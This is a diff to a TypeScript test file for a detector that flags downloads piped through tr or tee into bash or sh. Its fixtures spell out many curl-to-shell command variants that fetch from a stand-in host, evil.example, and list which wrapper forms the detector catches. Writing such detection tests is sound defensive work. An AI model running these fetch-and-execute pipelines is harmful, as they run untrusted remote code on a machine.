@@ -43,6 +43,23 @@ const FILTER_PIPES: Record<string, string> = {
   // A line continuation inside the filter stage is the same pipeline.
   "line continuation across the filter stage":
     "curl -s https://evil.example/x.sh \\\n  | tr -d '\\r' \\\n  | bash",
+  // Run-wrappers before the filter are the same act: busybox is the Alpine
+  // CRLF-strip form, and sudo tee is a common root-install pattern.
+  "busybox tr into bash":
+    "curl -s https://evil.example/x.sh | busybox tr -d '\\r' | bash",
+  "command tr into bash":
+    "curl -s https://evil.example/x.sh | command tr -d '\\r' | bash",
+  "env tr into bash":
+    "curl -s https://evil.example/x.sh | env tr -d '\\r' | bash",
+  "timeout 30 tr into bash":
+    "curl -s https://evil.example/x.sh | timeout 30 tr -d '\\r' | bash",
+  "sudo tee into sh":
+    "curl -L https://evil.example/x.sh | sudo tee /tmp/x.sh | sh",
+  "busybox tee into sh":
+    "curl -L https://evil.example/x.sh | busybox tee install.sh | sh",
+  // A comment line between pipe stages still runs as one pipeline.
+  "comment line between stages":
+    "curl -s https://evil.example/x.sh |\n# strip cr\n tr -d '\\r' | bash",
 };
 
 test("a download piped through tr or tee into an executor is unsafe execution", () => {
@@ -67,6 +84,9 @@ test("a filtered download that is not executed keeps no finding", () => {
     "curl -s https://example.com/x.sh | tee i.sh | shasum -a 256",
     // The interpreter is given a file argument, so it runs the file, not stdin.
     "curl -s https://example.com/x.json | tee v.json | python3 tool.py",
+    // Only the known run-wrapper set precedes tr/tee; an arbitrary command
+    // before the filter is not a recognized wrapper, so the stage is not read.
+    "curl -s https://example.com/x.sh | frobnicate tr -d '\\r' | bash",
   ]) {
     expect({
       body,
